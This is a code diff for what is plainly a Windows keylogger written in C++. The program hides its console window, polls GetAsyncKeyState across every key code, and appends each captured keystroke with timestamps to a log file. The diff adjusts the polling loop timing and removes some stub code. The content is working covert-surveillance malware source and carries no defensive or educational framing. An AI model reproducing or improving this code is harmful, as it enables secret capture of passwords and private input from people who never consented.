@@ -25,13 +25,6 @@ bool IS_LOGGING_RN = false;
 bool handle_special_key_press(char key, std::ostream& stream);
 void log(std::ostream&);
 
-// TODO: add multiple locations
-//const char* valid_log_directories[] = {
-//	"lang.txt",
-//	"usa.txt",
-//	"nine.txt"
-//};
-
 int main()
 {
 	// to hide the window
@@ -41,7 +34,7 @@ int main()
 	// Getting output stream ready
 	ofstream out_file;
 	out_file.open(LOG_LOCATION LOG_FILENAME, ios::app);
-	
+
 	// what if we are unable to open a file, Try different locations from list !
 	if (out_file.is_open())
 	{
@@ -56,19 +49,15 @@ int main()
 	return 0;
 }
 
-std::string get_time()
-{
-	return "";
-}
-
 void log(std::ostream& Sink)
 {
 	IS_LOGGING_RN = true;
 
-	auto end = std::chrono::system_clock::now();
-	std::time_t end_time = std::chrono::system_clock::to_time_t(end);
+	// Starting Logging
+	auto start = std::chrono::system_clock::now();
+	std::time_t start_time = std::chrono::system_clock::to_time_t(start);
 
-	Sink << endl << endl << endl << "[LOGGING STARTS] " << std::ctime(&end_time) << endl;
+	Sink << endl << endl << endl << "[LOGGING STARTS] " << std::ctime(&start_time) << endl;
 
 	char key = 0;
 	bool handled_as_special_key = false;
@@ -77,15 +66,17 @@ void log(std::ostream& Sink)
 	{
 		for (key = 0; key < 0xfe; key++)
 		{
+			if (key % 60 == 0) Sleep(1);
 			if (GetAsyncKeyState(key) & 1)
 			{
+
 				handled_as_special_key = handle_special_key_press(key, Sink);
 				if (handled_as_special_key) continue;
 				Sink << key;
 			}
 		}
-		Sleep(1000);
 	}
+
 	Sink << "[LOGGING ENDS]" << endl << endl;
 }
 
